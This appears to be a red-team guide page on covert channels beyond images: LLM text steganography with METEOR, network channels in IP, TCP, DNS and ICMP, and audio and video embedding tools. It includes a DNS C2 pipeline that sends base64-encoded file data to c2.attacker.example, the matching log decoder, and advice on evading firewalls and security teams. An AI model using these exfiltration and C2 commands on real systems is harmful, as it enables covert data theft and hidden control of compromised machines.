# Covert channels beyond images

Steganography is not limited to images. Any channel with sufficient redundancy or
variability can carry hidden data. This page covers LLM-based text channels, network
steganography, and audio and video approaches.

## LLM-based text channels

A language model generates text by sampling from a probability distribution over tokens.
At each step, the model assigns a probability to every possible next token given the
context. The choice of which token to sample is determined by the sampling algorithm.

If the sampling algorithm is deterministic and shared between sender and receiver, the
choice of token can encode information. The receiver, running the same model with the
same sampling key, can recover the encoded bits from the generated text.

This is the basis of several academic systems (Ziegler et al. METEOR, Kaptchuk et al.
Discop). The practical implementation requires:

- A shared language model (GPT-2 or similar, running locally on both ends)
- A shared secret key that seeds the sampling
- An agreed-upon prompt

Encode with METEOR:

```text
git clone https://github.com/tushar-semwal/METEOR
pip install -r requirements.txt
python encode.py --message "command: beacon" --key shared_secret --prompt "Write a product review."
```

The output is a plausible-looking product review that contains the encoded message.

Decode:

```text
python decode.py --text "The product arrived..." --key shared_secret --prompt "Write a product review."
```

Operational constraints: both endpoints need the same model weights and must agree on the
prompt format. Changes to the model or sampling parameters on one side break decoding.
The channel is low bandwidth (tens of bits per paragraph), which suits key exchange and
short commands but not bulk data transfer. The text survives casual reading but may not
survive editing or paraphrasing; agree on a no-modification channel (email, paste site).

## Network steganography

Network protocols have fields, timing characteristics, and ordering properties that can
carry covert data. Common examples:

IP header fields: the IP identification field, reserved bits, and TTL value can all carry
a small number of bits per packet. These are trivially detectable by anyone inspecting
headers, but they are also ignored by most automated analysis.

TCP timing: inter-packet delays can be modulated to encode data. A delay above a threshold
represents a 1; below represents a 0. Bandwidth is tiny but the channel is invisible to
content inspection.

DNS: embed data in subdomain labels of queries to an attacker-controlled resolver.
`aGVsbG8gd29ybGQ.attacker.example` carries a base64-encoded string in the subdomain.
The resolver logs the query; the data is extracted from the log. This is the most practical
network steganography channel for red team use because it uses existing DNS infrastructure
and generates queries that look like misconfigured or automated software.

DNS C2 via subdomain encoding:

```text
DATA=$(base64 -w 0 command.bin | tr '+/=' '-_.')
dig "${DATA}.c2.attacker.example" A
```

On the resolver side, log queries and decode:

```text
tail -f /var/log/named/queries.log | grep "c2.attacker.example" | \
  awk '{print $7}' | cut -d'.' -f1 | base64 -d
```

ICMP echo: data embedded in the payload field of ICMP echo requests. The `ping` payload
field is not inspected by most firewalls. `hping3` and `nping` allow arbitrary payload
specification.

## Audio and video

Audio steganography uses the redundancy in digital audio samples. The simplest method is
LSB substitution in WAV samples (equivalent to LSB in images). More robust methods embed
in the frequency domain: spread-spectrum audio steganography distributes energy across
frequencies below the audible noise floor.

Tools:

```text
# MP3Stego (embeds during MP3 encoding)
encode -E payload.txt -P password cover.wav stego.mp3

# DeepSound (Windows GUI, supports FLAC/WAV/MP3)
# Operates similarly to steghide for audio formats
```

Video steganography exploits temporal redundancy between frames. Embedding a small payload
per frame across a video clip accumulates significant capacity: 30 fps at 100 bits per
frame gives 3000 bits per second. The payload can be spread across frames with error
correction so that individual frames can be dropped or compressed without loss.

The operational advantage of video is that security teams almost never inspect video files
for steganographic content, and the file sizes are large enough that a meaningful payload
is a small fraction of the total.

OpenPuff supports MP4/AVI embedding with deniability (multiple decoy payloads at different
passwords):

```text
# GUI tool; command-line scripting requires OpenPuff CLI wrapper
openpuff.exe -hide -carrier video.mp4 -payload payload.bin -p1 realpass -p2 decoypass
```

## Choosing a channel

| Channel | Bandwidth | Detection risk | Operational complexity |
|---|---|---|---|
| Image (neural) | medium | low | medium |
| Image (LSB) | medium | medium | low |
| LLM text | very low | very low | high |
| DNS subdomains | low | low | low |
| Audio | medium | low | low |
| Video | high | very low | medium |
| Network timing | very low | very low | high |

For most red team engagements, image-based or DNS-based channels offer the best balance.
LLM and timing channels are high-complexity for the bandwidth they provide; they make sense
where the delivery medium is text-only or where every other channel is monitored.
